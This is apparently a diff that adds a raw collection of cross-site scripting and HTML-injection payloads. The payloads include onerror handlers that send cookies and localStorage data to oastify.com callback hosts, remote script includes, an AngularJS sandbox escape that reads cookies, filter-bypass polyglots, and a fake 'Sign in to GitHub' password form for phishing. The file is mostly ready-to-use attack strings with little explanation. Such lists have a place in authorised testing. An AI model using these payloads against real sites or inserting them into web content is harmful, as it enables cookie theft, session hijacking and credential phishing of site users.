@@ -1,0 +1,155 @@
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+
+``````````````````````````
+<p>§1: The first rule of Fight Club is: You do not talk about Fight Club.</p>
+
+<hr>
+
+<p>§2: The second rule of Fight Club is: Always bring cupcakes.</p>
+
+````````````````
+<img src=x onerror=this.src='http://9kuh56itn6outmgzi5opzqallcr6fv.oastify.com/?'+localStorage.getItem('d');>
+
+<object data="https://picsum.photos/200" ></object>
+
+<test><img src="https://picsum.photos/200">
+<h1><test><img src=x onerror=alert(document.domain)>qwer</h1>
+
+<img src=x draggable="true" ondrag="alert(1)">test</img>
+
+
+name field 
+-----------------------------
+XSS payload for an image:
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+<<script>alert('xss')<!--a-->a.png
+
+------------------------------------------
+
+onerror
+<h1><test><img src=x onclick=alert(document.domain)>qwer</h1>  *
+
+-----------------------https://infosecwriteups.com/xss-bypass-using-meta-tag-in-realestate-pdom javascriptostnl-nl-32db25db7308
+<meta name="language" content="0;data:text/html;base64,PHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgQnkgUHJpYWwiKTwvc2NyaXB0Pg=="HTTP-EQUIV="refresh"" />
+
+
+"><script src=https://lazdqmvxpzpb9st44lr74jxk8be82x.oastify.com></script>
+
+
+
+
+
+---------------------------
+<img src="x" onerror="document.write(window.location)" />
+void(0);
+
+<form><button formaction=javascript:alert(1)>click
+
+
+
+<img src=x onerror=this.src='http://1xxya2udyyfwkz4cvxwk66dtft6zwnl.oastify.com/?'+localStorage.getItem('d');>
+
+#"><a href=javaSCRIPT&colon;alert(/XSS/)> <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ76c8RC-DDeVG7fxBSInMzNNEJOtQafxfZgLkkxRYT85XsR9osvA" heigh="400" width="600"> </a> <div x="
+
+
+"/><svg/on<script>load=prompt(document.domain);>"/><svg/on<script>load=prompt(document.cookie);>
+
+
+
+<a href="https://securityz.net"><img src="https://securityz.net/mycrypto.jpeg"></a>
+
+
+<div class = "alert-message ng-binding" ng-bind-html = "alert.message">
+
+<noscript> <p title=” </noscript>
+
+
+<style onload= alert(document.domain)//”> {/*all/color/all/:/all/#f78fb3/all/;} </style>
+
+<img src=x onerror=prompt(1)>
+
+
+#’onclick=alert(document.domain)//
+
+
+
+
+<h1>>I am red</h1> <img src="https://picsum.photos/200)">
+
+
+<svg><script xlink:href=data:,alert("utyutyh1") />
+
+
+
+<object data=javascript:alert(1)>
+
+<html ontouchstart=alert(1)>
+
+
+<svg><script xlink:href=data:,alert("utyutyh1") />
+<embed src=//14.rs>
+<script src=//15.rs></script>
+<script/src=//⑮.₨>
+<img src="https://picsum.photos/200/300.jpg"><h1>HTML-Injection</h1>
+
+<iframe src="javascript:document.write(document.domain)" scrolling="no" sandbox="allow-scripts allow-popups allow-same-origin"></iframe>
+
+
+<img src=x onerror="this.src='http://ie09qsc4qubar7vsfk50uifh288ywn.oastify.com/?'+document.cookie; ">
+
+
+
+
+
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//spiderxssht.xss.ht></scripT>
+
+
+
+http://site.com/?ti_no=123456&mob=12345';alert(document.domain)//
+
+
+
+
+
+----------------------html=------------------
+
+$$<div style="position:fixed;padding:10%;padding-right:100%;left:-9%;top:-20%;background:white;padding-bottom:100%;"><section style="margin-left:500px;padding:30px;"><h2 style="text-align:center;">Sign in to GitHub</h2><div><label>Username: </label><input type=text style="border-radius:5px;border:1px solid;">
+<label>Password:  </label><input type=password style="border-radius:5px;border:1px solid;"><div style="text-align:center;"><button style="background:#2da44e;color:white;margin:10px;border-radius:9px;border:none;font-weight:500;padding:4px;padding-right:20px;padding-left:20px;" type=submit>Sign in</button></div></section></div></div>&lt;!--{}$$
+
+
+
+
+
+
+----------------------
+signIn=Sign In&password=g00dPa$$w0rD&url=login.jsp'"()&%<acx><ScRiPt >alert(9868)</ScRiPt>&username=tMtFQiRt
+
+3<math><style><img src=x onerror=alert(1)></style></math>
+
+username=<Script Language="Javascript">alert("You've been attacked!");</Script>
+
+
+
+```````````````````````````````````````````````````
+
+<Script Src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js>
+<K Ng-App>{{$new.constructor('alert(document.cookie)')()}}
+
+```````````````````````````````````````````````````````
+
+<spider attr=" --- x="=='='onmouseover=confirm`spider` style="display:block;width:1000px;height:1000px;background:red"> --- ">
+
+
+<s attr=" --- x="=='='onmouseover=confirm`sp` style=background:red"> --- ">
+
+
+
+
+
+
+
+
+
